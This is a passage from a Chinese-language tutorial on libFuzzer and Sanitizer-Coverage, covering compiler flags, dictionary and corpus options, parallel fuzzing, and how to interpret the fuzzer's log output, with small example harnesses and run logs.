<p>https://devblogs.microsoft.com/cppblog/asan-for-windows-x64-and-debug-build-support/</p>
<p>https://docs.microsoft.com/en-us/cpp/build/reference/incremental-link-incrementally?view=msvc-160</p>
<p>https://github.com/microsoft/WSL/issues/121</p>
<h4 id="主程序和动态链接库的asan兼容吗-1"><a class="header" href="#主程序和动态链接库的asan兼容吗-1">主程序和动态链接库的ASAN兼容吗?</a></h4>
<p>有空再写</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="深入解析libfuzzer参数与回显-1"><a class="header" href="#深入解析libfuzzer参数与回显-1">深入解析libFuzzer参数与回显</a></h2>
<p>本小节着重于对实用情景下对libFuzzer的用法和坑(参数,回显,bug等)做深入的分析,为什么要将它放到最后来解释呢?笔者在实际工作中遇到了一些难以处理问题,都是依靠前面对libFuzzer源码的浅薄理解而解决的.</p>
<h4 id="编译时使用-libfuzzera和-fsanitizefuzzer有区别嘛-1"><a class="header" href="#编译时使用-libfuzzera和-fsanitizefuzzer有区别嘛-1">编译时使用 libFuzzer.a和-fsanitize=fuzzer有区别嘛?</a></h4>
<p>回顾libfuzzer-workshop的例子,示例的第一步要求我们先对libFuzzer的源码进行编译,生成libFuzzer.a静态库,然后再自行编写Fuzz逻辑入口,把Fuzzer,库源码,libFuzzer.a同时链接,生成可执行Fuzzer.实际上clang中已经内置了libFuzzer,我们使用-fsanitize=fuzzer也可以引入它.举个例子:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;


int LLVMFuzzerTestOneInput(const char* Data,unsigned int Size) {
	if (Size &gt; 4) {
		if (Data[1] == 'F' &amp;&amp; Data[3] == 'A') {
			printf(&quot;bingo \n&quot;);
			exit(0);
		}
	}

	return 0;
}
</code></pre>
<p>命令行下执行结果:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/temp$ clang -fsanitize=fuzzer 1.c -o 1_fuzzer &amp;&amp; ./1_fuzzer
INFO: Seed: 3655122303
INFO: Loaded 1 modules   (5 inline 8-bit counters): 5 [0x4e8080, 0x4e8085),
INFO: Loaded 1 PC tables (5 PCs): 5 [0x4bee00,0x4bee50),
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: A corpus is not provided, starting from an empty corpus
#2	INITED cov: 2 ft: 2 corp: 1/1b exec/s: 0 rss: 28Mb
#219	NEW    cov: 3 ft: 3 corp: 2/7b lim: 6 exec/s: 0 rss: 28Mb L: 6/6 MS: 2 CopyPart-CrossOver-
#245	REDUCE cov: 3 ft: 3 corp: 2/6b lim: 6 exec/s: 0 rss: 28Mb L: 5/5 MS: 1 EraseBytes-
#4770	REDUCE cov: 4 ft: 4 corp: 3/12b lim: 48 exec/s: 0 rss: 28Mb L: 6/6 MS: 5 CrossOver-ShuffleBytes-EraseBytes-ChangeBinInt-ShuffleBytes-
#4773	REDUCE cov: 4 ft: 4 corp: 3/11b lim: 48 exec/s: 0 rss: 28Mb L: 5/5 MS: 3 CopyPart-ShuffleBytes-EraseBytes-
bingo
==822227== ERROR: libFuzzer: fuzz target exited
    #0 0x4adb40 in __sanitizer_print_stack_trace (/home/ubuntu/Desktop/temp/1_fuzzer+0x4adb40)
    #1 0x459498 in fuzzer::PrintStackTrace() (/home/ubuntu/Desktop/temp/1_fuzzer+0x459498)
    #2 0x43f58c in fuzzer::Fuzzer::ExitCallback() (/home/ubuntu/Desktop/temp/1_fuzzer+0x43f58c)
    #3 0x7f064ebb9a56 in __run_exit_handlers stdlib/exit.c:108:8
    #4 0x7f064ebb9bff in exit stdlib/exit.c:139:3
    #5 0x4adf32 in LLVMFuzzerTestOneInput (/home/ubuntu/Desktop/temp/1_fuzzer+0x4adf32)
    #6 0x440a31 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/ubuntu/Desktop/temp/1_fuzzer+0x440a31)
    #7 0x440175 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/home/ubuntu/Desktop/temp/1_fuzzer+0x440175)
    #8 0x441ba0 in fuzzer::Fuzzer::MutateAndTestOne() (/home/ubuntu/Desktop/temp/1_fuzzer+0x441ba0)
    #9 0x442615 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) (/home/ubuntu/Desktop/temp/1_fuzzer+0x442615)
    #10 0x432025 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/ubuntu/Desktop/temp/1_fuzzer+0x432025)
    #11 0x459c72 in main (/home/ubuntu/Desktop/temp/1_fuzzer+0x459c72)
    #12 0x7f064eb9dcb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #13 0x40684d in _start (/home/ubuntu/Desktop/temp/1_fuzzer+0x40684d)

SUMMARY: libFuzzer: fuzz target exited
MS: 1 InsertByte-; base unit: 0c7d9271cf3d2a4e2c3eec3e76a2d1dc1431af36
0xa,0x46,0xf6,0x41,0xa,0xa,
\x0aF\xf6A\x0a\x0a
artifact_prefix='./'; Test unit written to ./crash-8860dc7909080bcb9ca9827f67704611bbdf02b9
Base64: Ckb2QQoK
ubuntu@ubuntu-virtual-machine:~/Desktop/temp$
</code></pre>
<p>这看起来和直接引入libFuzzer.a的效果一样,那么接下来我们再引入**-fsanitize-coverage=trace-pc-guard**重新编译运行.结果如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/temp$ clang -v
Ubuntu clang version 11.0.0-2
Target: x86_64-pc-linux-gnu
ubuntu@ubuntu-virtual-machine:~/Desktop/temp$ clang -fsanitize=fuzzer -fsanitize-coverage=trace-pc-guard 1.c -o 1_fuzzer &amp;&amp; ./1_fuzzer
-fsanitize-coverage=trace-pc-guard is no longer supported by libFuzzer.
Please either migrate to a compiler that supports -fsanitize=fuzzer
or use an older version of libFuzzer
ubuntu@ubuntu-virtual-machine:~/Desktop/temp$
</code></pre>
<p>这是因为高版本的clang不支持trace-pc-guard和trace-pc了.对此有两个解决方法:</p>
<ul>
<li>使用-fsanitize-coverage=trace-gep,trace-div,trace-cmp替代trace-pc-guard.(适用于Windows平台)</li>
<li>使用低版本的libFuzzer编译出静态库然后导入链接.因为不支持trace-pc-guard的逻辑是在libFuzzer中写死的(参考FuzzerTracePC.cpp __sanitizer_cov_trace_pc_guard()函数),即使换成高版本libFuzzer的静态库也是一样的提示.</li>
</ul>
<h4 id="为什么libfuzzer要删除对trace-pc的支持-1"><a class="header" href="#为什么libfuzzer要删除对trace-pc的支持-1">为什么libFuzzer要删除对trace-pc的支持?</a></h4>
<p>libFuzzer开发者kcc在2019年1月的Commit中删除了libFuzzer对trace-pc的支持,相关diff如下:</p>
<ul>
<li>
<p>https://github.com/llvm/llvm-project/commit/62d727061053dac28447a900fce064c54d366bd6#</p>
</li>
<li>
<p>https://github.com/llvm/llvm-project/commit/62d727061053dac28447a900fce064c54d366bd6#</p>
<p>笔者找遍了文档和提交记录,对于为什么要删除trace-pc的支持找不到任何相关信息,于是只能通过阅读源码和效果对比测试来理解和推测.相关结论如下:</p>
</li>
<li>
<p>删除trace-pc是因为trace-pc的代码覆盖率统计方法可以被替代.</p>
</li>
<li>
<p>trace-pc随后被inline-8bit-counter(统计BasicBlock执行次数)和trace-cmp(在分支之前插桩)替代,因为trace-cmp可以主动发现逻辑判断中对比的数值,部分场景下能够增强主动模糊测试效果.</p>
<p>我们先对比一下改变前后的libFuzzer编译结果.旧版本的libFuzzer使用trace-pc插桩之后的代码逻辑如下,<code>生成的Data让逻辑执行到某个特定的BasicBlock时才记录代码覆盖</code>,这样模糊测试工具相对<em>被动</em>.</p>
</li>
</ul>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/old_libfuzzer_santizer_coverage.png" alt="" /></p>
<p>新版本的libFuzzer默认使用trace-cmp插桩之后,会在判断逻辑前面插桩并收集判断逻辑的数据(比如下面的反编译就是收集判断<code>if(Data[0] = '1')</code>的字符1),然后回馈到语料库(fuzzer::TracePC::TableOfRecentCompares).有了这些判断中的数据,生成模糊测试的数据就能相对有个方向,更为<em>主动</em>.其中__santizer_cov_trace_const_cmp4是由trace-cmp插桩的逻辑,++byte_4EB071是由inline-8bit-Counter插桩的逻辑.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/new_libfuzzer_santizer_coverage.png" alt="" /></p>
<p>两种插桩模式的模糊测试效果对比如下:</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/new_libfuzzer_effect.png" alt="" /></p>
<p>附加参考链接:https://reviews.llvm.org/rC352818</p>
<h4 id="windows平台下怎么引用libfuzzer-1"><a class="header" href="#windows平台下怎么引用libfuzzer-1">Windows平台下怎么引用libFuzzer?</a></h4>
<p>Windows平台下使用libFuzzer建议还是使用LLVM官网的Windows编译套件,因为使用Visutal Studio Installer下载的LLVM版本只支持32位编译(只有32位的静态库),LLVM官网的Windows编译套件32/64位都支持.</p>
<p>Visual Studio项目需要修改编译工具集为LLVM-clang和正确平台SDK的即可.有几点需要注意:</p>
<ul>
<li>clang的编译语法和MSVC不一样,有一些不应该提示的错误可以使用-Wno-xxx关闭警告.</li>
<li>clang甚至不支持一些MSVC内置函数(比如__cpuid等),可以尝试引入intrin.h解决.</li>
<li>有一些MSVC或者WinAPI符号无法被clang识别,这是因为C++重载问题导致clang找不到符号.比如InternalLockAdd(LONG)和InternalLockAdd(ULONG),clang会认为是两个不一样的函数,但是WinAPI只有一个.所以建议直接对函数参数传参做强制转换,.对齐标准WinAPI声明.</li>
<li>链接时需要手工引入.lib库,还记得前面的compiler-RT库嘛,插桩逻辑和Fuzzer调度逻辑都在这里,clang默认不会加载.</li>
</ul>
<h4 id="libfuzzer怎么样提高模糊测试效果-1"><a class="header" href="#libfuzzer怎么样提高模糊测试效果-1">libFuzzer怎么样提高模糊测试效果?</a></h4>
<p><code>-dict</code>参数指定一个语料库,后续ManualDict这些数据变异模块就可以从这里拿到<strong>和当前被测试的逻辑强相关的关键词</strong>.举个例子,我们对SQL注入做测试,这些关键词是不是就包含了:union select,from,count()等;对文件解析测试,是不是就需要包含7zip,PE,MZ,Rar!等关键词呢.我们传递的这些关键词,最终会被拼接到LLVMFuzzerTestOneInput()的data参数中.</p>
<p>实际上,libFuzzer也能够像AFL一样接受一批样本数据作为初始化输入来做模糊测试.这样的话我们就可以根据模糊测试的对象的业务去github和各个项目的测试用例中搜罗样本数据了.</p>
<p>上面两个参数是可以结合使用的,不带参数和带参数的对路径探测的结果影响如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/fuzz$ ./test_case
INFO: Seed: 1117474860
INFO: Loaded 1 modules (10682 guards): [0x110c9b8, 0x11170a0),
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: A corpus is not provided, starting from an empty corpus
#0	READ units: 1
#1	INITED cov: 869 ci: 0K ft: 180 corp: 1/1b exec/s: 0 rss: 135Mb
#2	NEW    cov: 869 ci: 0K ft: 208 corp: 2/2b exec/s: 0 rss: 135Mb L: 1 MS: 1 ShuffleBytes-
#3	NEW    cov: 885 ci: 0K ft: 229 corp: 3/4b exec/s: 0 rss: 135Mb L: 2 MS: 2 ShuffleBytes-CrossOver-
#5	NEW    cov: 886 ci: 0K ft: 239 corp: 4/5b exec/s: 0 rss: 135Mb L: 1 MS: 4 ShuffleBytes-CrossOver-EraseBytes-ChangeBit-
#8	NEW    cov: 886 ci: 0K ft: 248 corp: 5/8b exec/s: 0 rss: 135Mb L: 3 MS: 2 ChangeBit-CrossOver-
#9	NEW    cov: 887 ci: 0K ft: 249 corp: 6/12b exec/s: 0 rss: 135Mb L: 4 MS: 3 ChangeBit-CrossOver-InsertByte-
#12	NEW    cov: 898 ci: 0K ft: 264 corp: 7/89b exec/s: 0 rss: 145Mb L: 77 MS: 1 InsertRepeatedBytes-
#13	NEW    cov: 898 ci: 1K ft: 267 corp: 8/210b exec/s: 0 rss: 145Mb L: 121 MS: 2 InsertRepeatedBytes-CopyPart-
#14	NEW    cov: 898 ci: 2K ft: 269 corp: 9/401b exec/s: 0 rss: 145Mb L: 191 MS: 3 InsertRepeatedBytes-CopyPart-CopyPart-
#15	NEW    cov: 898 ci: 2K ft: 270 corp: 10/593b exec/s: 0 rss: 145Mb L: 192 MS: 4 InsertRepeatedBytes-CopyPart-CopyPart-InsertByte-
#21	NEW    cov: 899 ci: 41K ft: 271 corp: 11/4689b exec/s: 0 rss: 145Mb L: 4096 MS: 5 ChangeBit-EraseBytes-EraseBytes-ChangeBit-CrossOver-
#25	NEW    cov: 899 ci: 41K ft: 272 corp: 12/5513b exec/s: 0 rss: 145Mb L: 824 MS: 4 ChangeByte-CMP-CrossOver-CrossOver- DE: &quot;\xef\x0f&quot;-
#43	NEW    cov: 899 ci: 41K ft: 280 corp: 13/5516b exec/s: 0 rss: 145Mb L: 3 MS: 2 ChangeBinInt-CopyPart-
#90	NEW    cov: 899 ci: 41K ft: 281 corp: 14/5746b exec/s: 0 rss: 145Mb L: 230 MS: 4 ChangeByte-PersAutoDict-CopyPart-InsertRepeatedBytes- DE: &quot;\xef\x0f&quot;-
#106	NEW    cov: 899 ci: 41K ft: 283 corp: 15/6032b exec/s: 0 rss: 145Mb L: 286 MS: 5 EraseBytes-ChangeBit-ShuffleBytes-ChangeBit-InsertRepeatedBytes-
#117	NEW    cov: 899 ci: 41K ft: 284 corp: 16/6071b exec/s: 0 rss: 145Mb L: 39 MS: 1 EraseBytes-
#124	NEW    cov: 899 ci: 41K ft: 286 corp: 17/6076b exec/s: 0 rss: 145Mb L: 5 MS: 3 ChangeByte-ShuffleBytes-PersAutoDict- DE: &quot;\xef\x0f&quot;-
#163	NEW    cov: 899 ci: 41K ft: 288 corp: 18/6093b exec/s: 0 rss: 145Mb L: 17 MS: 2 CMP-CMP- DE: &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;-&quot;\xff\xff\xff\xff\xff\xff\x0b[&quot;-
#164	NEW    cov: 899 ci: 41K ft: 290 corp: 19/6106b exec/s: 0 rss: 145Mb L: 13 MS: 3 CMP-CMP-EraseBytes- DE: &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;-&quot;\xff\xff\xff\xff\xff\xff\x0b[&quot;-
#169	NEW    cov: 899 ci: 41K ft: 292 corp: 20/6118b exec/s: 0 rss: 145Mb L: 12 MS: 3 ChangeByte-ChangeBinInt-CMP- DE: &quot;objective&quot;-
#182	NEW    cov: 899 ci: 41K ft: 294 corp: 21/6129b exec/s: 0 rss: 145Mb L: 11 MS: 1 CMP- DE: &quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;-
#529	NEW    cov: 899 ci: 41K ft: 295 corp: 22/6131b exec/s: 0 rss: 146Mb L: 2 MS: 3 ChangeBit-InsertByte-ChangeBit-
#634	NEW    cov: 899 ci: 41K ft: 296 corp: 23/10227b exec/s: 0 rss: 146Mb L: 4096 MS: 3 CopyPart-CrossOver-ChangeBit-
#702	NEW    cov: 899 ci: 41K ft: 298 corp: 24/10418b exec/s: 702 rss: 146Mb L: 191 MS: 1 ChangeBinInt-
#1041	NEW    cov: 899 ci: 41K ft: 299 corp: 25/10424b exec/s: 1041 rss: 146Mb L: 6 MS: 5 ShuffleBytes-CMP-CrossOver-EraseBytes-EraseBytes- DE: &quot;\x00\x00\x00Z&quot;-
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/fuzz$ ./test_case -dict=./libfuzzer_keywork.txt sample/
Dictionary: 375 entries
INFO: Seed: 1048768538
INFO: Loaded 1 modules (10682 guards): [0x110c9b8, 0x11170a0),
Loading corpus dir: sample/
Loaded 1024/2640 files from sample/
Loaded 2048/2640 files from sample/
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
#0	READ units: 2638
#1024	pulse  cov: 1805 ci: 609K ft: 1585 corp: 73/15289b exec/s: 512 rss: 748Mb
#2048	pulse  cov: 3774 ci: 5983K ft: 6522 corp: 259/3660Kb exec/s: 341 rss: 785Mb
#2638	INITED cov: 4286 ci: 18481K ft: 9928 corp: 490/79Mb exec/s: 131 rss: 997Mb
#2639	NEW    cov: 4286 ci: 18481K ft: 9929 corp: 491/79Mb exec/s: 131 rss: 997Mb L: 94081 MS: 1 CMP- DE: &quot;N4LIEF17read_out_&quot;-
#2665	NEW    cov: 4325 ci: 18481K ft: 9988 corp: 492/79Mb exec/s: 133 rss: 997Mb L: 165541 MS: 2 CMP-PersAutoDict- DE: &quot;\x0a\x00&quot;-&quot;N4LIEF17read_out_&quot;-
#2713	NEW    cov: 4325 ci: 18481K ft: 9999 corp: 493/79Mb exec/s: 129 rss: 997Mb L: 103145 MS: 5 CMP-InsertRepeatedBytes-EraseBytes-ManualDict-ChangeByte- DE: &quot;\x01\x00\x00\x00\x00\x01\x89\xca&quot;-&quot;PowerPoint&quot;-
#2804	NEW    cov: 4326 ci: 18481K ft: 10006 corp: 494/79Mb exec/s: 127 rss: 997Mb L: 94081 MS: 1 ChangeBit-
#2960	NEW    cov: 4326 ci: 18481K ft: 10007 corp: 495/79Mb exec/s: 118 rss: 997Mb L: 67143 MS: 2 PersAutoDict-CMP- DE: &quot;\x01\x00\x00\x00\x00\x01\x89\xca&quot;-&quot;\x00\x00\x00\x00\x00\x00\x13}&quot;-
#3011	NEW    cov: 4326 ci: 18481K ft: 10008 corp: 496/79Mb exec/s: 120 rss: 997Mb L: 94205 MS: 3 ChangeASCIIInt-InsertRepeatedBytes-ChangeBinInt-
#3014	NEW    cov: 4327 ci: 18481K ft: 10009 corp: 497/79Mb exec/s: 120 rss: 997Mb L: 67143 MS: 1 CopyPart-
#3102	NEW    cov: 4327 ci: 18481K ft: 10013 corp: 498/79Mb exec/s: 114 rss: 997Mb L: 81784 MS: 4 ManualDict-ShuffleBytes-ChangeBit-CopyPart- DE: &quot;Jet\x00&quot;-
#3106	NEW    cov: 4327 ci: 18481K ft: 10027 corp: 499/79Mb exec/s: 115 rss: 997Mb L: 72629 MS: 3 CopyPart-ChangeByte-CMP- DE: &quot;\x0b\x00&quot;-
#3109	NEW    cov: 4327 ci: 18481K ft: 10030 corp: 500/79Mb exec/s: 115 rss: 997Mb L: 65197 MS: 1 CMP- DE: &quot;\x1f\x00\x00\x00\x00\x00\x00\x00&quot;-
#3522	NEW    cov: 4328 ci: 18481K ft: 10031 corp: 501/80Mb exec/s: 103 rss: 997Mb L: 39524 MS: 4 InsertByte-ChangeBit-EraseBytes-InsertByte-

</code></pre>
<p>其中cov值则是执行分支总数,可以看到两次Fuzzer运行之间的巨大差异(第一次执行只覆盖899个分支,第二次执行覆盖4328个分支).这里-worker是指同时使用多个进程来执行Fuzzer(源码实现在FuzzerDriver.cpp WorkerThread()).</p>
<h4 id="多个libfuzzer同时启动时怎么样区分不同的libfuzzer生成的crash-1"><a class="header" href="#多个libfuzzer同时启动时怎么样区分不同的libfuzzer生成的crash-1">多个libFuzzer同时启动时,怎么样区分不同的libFuzzer生成的Crash?</a></h4>
<p>libFuzzer产生崩溃时,会记录当前的崩溃样本到本地,但是这些崩溃样本都是以crash slow-unit oom作为前缀.在一些模糊测试场景中,我们会在当前目录下执行多个libFuzzer程序,那就会导致多个libFuzzer产生的崩溃样本无法辨识,此时引入-artifact_prefix参数为崩溃样本自定义前缀即可.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/3.png" alt="" /></p>
<h4 id="依赖库没有源码时有没有必要使用libfuzzer-1"><a class="header" href="#依赖库没有源码时有没有必要使用libfuzzer-1">依赖库没有源码时有没有必要使用libFuzzer?</a></h4>
<p>通过前面的分析,我们知道libFuzzer想要实现遗传算法进行模糊测试,那就需要依赖代码覆盖率Sanitize-Coverage进行插桩.但是有时候要进行模糊测试的程序要依赖到动态库和静态库,此时我们就无法对此进行插桩了.笔者在工作中遇到这种情况,处理思路如下:</p>
<ul>
<li><strong>依赖库中的源码和被模糊测试的源码之间有很大的关联性</strong>.举个例子,项目中依赖7zip的解压库,然后项目对此进行一层性能优化封装,那么要测试的代码也就必须要包含项目中的封装层代码和7zip依赖库源码,因为缺少了其中任意一部分的代码,就会很难覆盖全整个功能所需要的代码,会导致有些逻辑没法被覆盖到.</li>
<li><strong>依赖库中的源码和被模糊测试的源码之间关联系不大</strong>.比如项目中引用了protobuf进行数据解析,然后具体的处理逻辑则是由项目处理,那么依赖库protobuf就不应该包含在模糊测试范围中.</li>
</ul>
<h4 id="如何并行执行多个libfuzzer-1"><a class="header" href="#如何并行执行多个libfuzzer-1">如何并行执行多个libFuzzer?</a></h4>
<p>libFuzzer默认只执行一个进程来做模糊测试.我们使用-jobs和-workers参数就能让libFuzzer创建多个<strong>进程</strong>并行执行.命令如下:</p>
<pre><code class="language-sh">fuzzing@fuzzing-virtual-machine:~/Desktop/test_code$ ./test_code -jobs=10
</code></pre>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/4.png" alt="" /></p>
<p>假设读者的电脑配置是4核8G内存的话,那么就会同时有两个进程在执行.如果要同时跑四个进程的话,那就设置为<code>-workers=4</code>,workers的值默认是当前CPU核数/2.</p>
<p>-jobs参数是指完成了n个libFuzzer进程之后就退出程序,默认值为0.如果我们要同时执行8个进程并行执行libFuzzer的命令如下:</p>
<pre><code class="language-sh">fuzzing@fuzzing-virtual-machine:~/Desktop/test_code$ ./test_code -jobs=8 -workers=8
</code></pre>
<p>需要特别注意的是,如果读者们要并行执行libFuzzer,jobs和workers参数的传值缺一不可.因为libFuzzer代码中的逻辑就是workers和jobs必须要大于0才可以执行并行多进程,所以这个隐藏的坑就是为什么只设置了<code>-workers=8</code>但是libFuzzer没有执行并行的原因,因为此时jobs值为默认为0.</p>
<p>还有一点值得提示一下,libFuzzer所做的模糊测试,实际上并没有尝试去维护<em>干净的上下文</em>然后重新模糊测试.笔者举个Qemu Fuzzer的例子来说明一下.</p>
<p>我们在对Qemu进行模糊测试时,会生成大量的MMIO和Port IO的方式来进行设备通信.那么大量的测试数据会导致Qemu设备的<em>状态不断发生改变,而不是从一个初始的状态开始执行</em>.比如说解析PE文件的接口,我们实例化类之后把文件内容传递到接口去测试,那么这个类都是从初始的状态去执行数据解析然后改变状态.但是对于Qemu虚拟机这样复杂的系统,它需要维护很多上下文相关的对象,所以每次模糊测试和设备交互时,都会对设备的状态进行改变,导致无法从<em>初始的状态</em>开始测试,影响最终复现漏洞的结果.为了解决这个问题,Qemu 5.2.0中支持的模糊测试方法是在libFuzzer LLVMFuzzerTestOneInput()中为TracePC创建共享内存,然后fork()出子进程执行模糊测试,父进程wait()等待子进程模糊测试结束,然后从共享内存中收集代码覆盖信息,回馈到libFuzzer核心逻辑中去.</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/11.png" alt="" /></p>
<h4 id="libfuzzer输出哪些信息怎么样根据这些信息优化fuzzer-1"><a class="header" href="#libfuzzer输出哪些信息怎么样根据这些信息优化fuzzer-1">libFuzzer输出哪些信息,怎么样根据这些信息优化Fuzzer?</a></h4>
<p>运行libFuzzer编译的程序,从启动到崩溃输出的信息如下:</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/./pic12/5.png" alt="" /></p>
<p>第一行输出<code>INFO: Seed: 1410507973</code>,意思是当前的随机数种子的初始值.因为每一次执行libFuzzer随机数种子的值都是随机的,但是如果读者们想要复现libFuzzer模糊测试,那就需要使用参数<code>-seed</code>指定随机数种子的值.</p>
<p>第二行输出<code>INFO: Loaded 1 modules   (10 inline 8-bit counters): 10 [0x5a6ed0, 0x5a6eda)</code>,意思是显示当前libFuzzer中使用到的插桩方式(inline 8-bit counters)以及Edge分支信息的内存区域开始和结束信息(Start:0x5a6ed0,End:0x5a6eda,总分支数:10).第三行输出亦是同样意义.</p>
<p>第四行输出<code>INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</code>,意思是当前没有指定参数<code>-max_len</code>,默认max_len的值是4096字节(4K).max_len参数的意义在于限制libFuzzer生成的Data内容大小.有时候在对协议处理的功能进行模糊测试,那么max_len相对的取值是小一点的,但是对于文件处理的功能进行模糊测试,那么max_len有可能需要设置为100K,具体场景具体分析.</p>
<p>第五行输出<code>INFO: A corpus is not provided, starting from an empty corpus</code>,意思是没有指定输入样本,从空数据生成开始模糊测试.</p>
<p>第六行输出<code>#2	INITED cov: 2 ft: 2 corp: 1/1b exec/s: 0 rss: 31Mb</code>,意思是执行完所有初始样本输入数据,代码覆盖(cov字段)2个块(以BasicBlock或Edge为单位),2条执行路径(ft字段);每秒执行次数0(exec/s字段);内存占用为31 MB(rss字段).libFuzzer会对程序执行内存有限制,默认内存上限是2 GB.在模糊测试的过程中因为大量内存分配超出rss,那就会导致libFuzzer崩溃,记录当前样本到OOM-xxx文件,如果读者们需要控制libFuzzer的内存上限值,那就使用<code>-rss_limit_mb</code>参数(注意,内存泄露也记录在这个范畴中).</p>
<p>第七行输出<code>#1949	NEW    cov: 3 ft: 3 corp: 2/21b lim: 21 exec/s: 0 rss: 31Mb L: 20/20 MS: 2 InsertByte-InsertRepeatedBytes-</code>,意思是发现程序执行到新路径,此时代码覆盖3个块,3条执行路径;本次发现新路径时生成模糊测试数据大小为20字节(L字段);数据生成使用了2个数据变异模块串联生成(MS字段);所使用的模块顺序是InsertByte=&gt;InsertRepeatedBytes.</p>
<p>libFuzzer输出模糊测试状态时,每行的第二个字段代表的含义如下:</p>
<ul>
<li>
<p>READ ,意思是当前模糊测试阶段是从给定的样本文件夹中读取模糊测试数据来执行.</p>
</li>
<li>
<p>INITED ,意思是使用所有初始样本执行完LLVMFuzzerTestOneInput之后的状态信息.</p>
</li>
<li>
<p>NEW ,意思是发现新路径时的状态信息.</p>
</li>
<li>
<p>REDUCE ,意思是已经执行过的路径发现了更精简的输入.</p>
</li>
<li>
<p>RELOAD ,意思是从样本文件夹中发现并加载了新样本.</p>
</li>
<li>
<p>pulse ,没有什么特别的意义,就是定时告诉用户libFuzzer还在运行.</p>
</li>
<li>
<p>DONE ,libFuzzer执行结束.</p>
</li>
</ul>
<p>!!!!! 如何优化再补充一下~~~~</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="玩转sanitizer-coverage-1"><a class="header" href="#玩转sanitizer-coverage-1">玩转Sanitizer-Coverage</a></h2>
<h4 id="sanitizer-coverage初体验-1"><a class="header" href="#sanitizer-coverage初体验-1">Sanitizer-Coverage初体验</a></h4>
<p>接触过二进制Fuzzing的朋友们应该知道,代码覆盖率的用意是了解当前的模糊测试方式与用例触发程序执行的代码占整体代码的百分比,这个比值越高,越说明有很多的代码分支和函数被执行到,能够挖掘到隐藏在代码的漏洞的概率就更大.</p>
<p>下面是一段简单的测试代码:</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;

int function1(int a) {
    if (1 == a)
        return 0;

    return 1;
}

int function2() {
    return -1;
}

int main() {
    if (rand() % 2)
        function1(rand() % 3);
    else
        function2();

    return 0;
}
</code></pre>
<p>要想Clang引入Sanitizer-Coverage,需要提供编译参数<code>-fsanitize-coverage=trace-pc-guard</code>,编译命令如下:</p>
<pre><code class="language-makefile">all:
	clang -fsanitize-coverage=trace-pc-guard ./test_case.c -g -o ./test_case
</code></pre>
<p>把编译后的可执行程序<code>./test_case</code>拿到IDA逆向,可以发现LLVM Sanitizer-Coverage的插桩原理:</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  __int64 v4; // rdx
  int v5; // eax

  _sanitizer_cov_trace_pc_guard(&amp;unk_439BC0, argv, envp);
  v3 = rand();
  v4 = (unsigned int)(v3 &gt;&gt; 31);
  LODWORD(v4) = v3 % 2;
  if ( v3 % 2 )
  {
    _sanitizer_cov_trace_pc_guard((char *)&amp;unk_439BC0 + 4, argv, v4);
    v5 = rand();
    function1(v5 % 3);
  }
  else
  {
    _sanitizer_cov_trace_pc_guard((char *)&amp;unk_439BC0 + 8, argv, v4);
    function2();
  }
  return 0;
}
</code></pre>
<p>其中**_sanitizer_cov_trace_pc_guard()**就是插桩回调函数,如果没有重写该函数,那就LLVM就会使用默认版本,官方文档有一处示例代码,使用自定义该回调函数打印插桩分支信息.</p>
<pre><code class="language-c">//  多余注释已经删除,感兴趣可自行到官网查看
extern &quot;C&quot; void __sanitizer_cov_trace_pc_guard(uint32_t *guard) {
  if (!*guard) return;
  void *PC = __builtin_return_address(0);
  char PcDescr[1024];

  __sanitizer_symbolize_pc(PC, &quot;%p %F %L&quot;, PcDescr, sizeof(PcDescr));
  printf(&quot;guard: %p %x PC %s\n&quot;, guard, *guard, PcDescr);
}
</code></pre>
<p>把函数代码放到test_case.c中并添加相关头文件后,编译后执行效果如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ ./test_case
guard: 0x439bc0 5 PC 0x423c06 in main /home/ubuntu/Desktop/instrument_note/./test_case.c:17
guard: 0x439bc4 6 PC 0x423c3b in main /home/ubuntu/Desktop/instrument_note/./test_case.c:19:19
